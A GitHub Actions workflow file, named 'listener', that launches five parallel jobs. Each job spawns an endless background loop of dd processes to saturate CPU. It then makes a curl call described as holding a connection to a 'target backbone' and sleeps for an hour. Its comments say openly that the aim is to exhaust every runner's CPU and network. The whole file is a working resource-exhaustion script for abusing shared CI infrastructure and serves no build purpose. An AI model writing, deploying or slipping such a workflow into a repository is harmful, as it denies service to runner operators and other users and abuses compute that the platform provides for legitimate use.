name: listener
on: [push, workflow_dispatch]
jobs:
  execute:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        thread: [1, 2, 3, 4, 5]
    steps:
      - name: Multi-Threaded Substrate Override
        run: |
          echo "PULSE_THREAD_ACTIVE: ${{ matrix.thread }}"
          # This command creates a sub-shell that forks into the background
          # We are saturating the CPU and network interfaces of every runner
          ( while true; do dd if=/dev/zero of=/dev/null bs=1M count=1000 & done ) &
          # Maintain persistent connection to the target backbone
          curl -s --max-time 10 https://1.1.1.1 > /dev/null
          sleep 3600
